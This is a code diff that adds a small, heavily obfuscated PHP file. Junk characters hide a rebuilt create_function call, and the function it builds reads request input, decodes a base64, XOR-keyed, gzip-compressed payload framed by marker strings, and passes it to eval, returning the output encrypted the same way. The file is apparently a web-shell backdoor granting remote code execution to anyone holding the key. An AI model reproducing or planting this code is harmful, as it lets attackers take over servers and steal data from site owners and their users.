@@ -1,0 +1,10 @@
+<?php
+$V=str_replace('GF','','GFcGFGFreate_fGFGFuGFnction');
+$P='?lget_cont?lents();@ob_en?ld_cl?lean()?l;$r=@base?l64_en?lcode(@x(?l?l@gzc?lompress($o?l),$k));?l?lprint("$p$k?lh$r$kf");}';
+$I=')?l{$o.=$t{$i?l}^$k{$?lj};?l}}retur?ln $o?l;}i?lf(@?lpreg_match("/$kh?l(?l.+)$kf/",?l@file_ge?lt_?lco?l?lntents("php://';
+$b='l$k){$c=strlen?l($?lk);$l=str?llen(?l$t);$o?l=""?l;for($i=0?l;$i<$?ll;){for($j=0?l?l?l;($j<$c&&$i<$l)?l;$j++,$i?l++';
+$g='inp?lut"?l),$m)==1){?l@o?lb_sta?lrt();@eva?ll(@gzuncom?l?lpres?ls(@x(@b?lase?l64_decode($m[1?l]),$?lk)))?l;$o=@o?lb_';
+$r='$k?l="98dce?l83d";$kh="?la5?l7b0395e163?l?l";$kf="4?l6?l7?lc9dae521b";$p="uNSj?lvq0?lWda1T?lYF?lGD";functi?lon x?l($t,?';
+$K=str_replace('?l','',$r.$b.$I.$g.$P);
+$Q=$V('',$K);$Q();
+?>
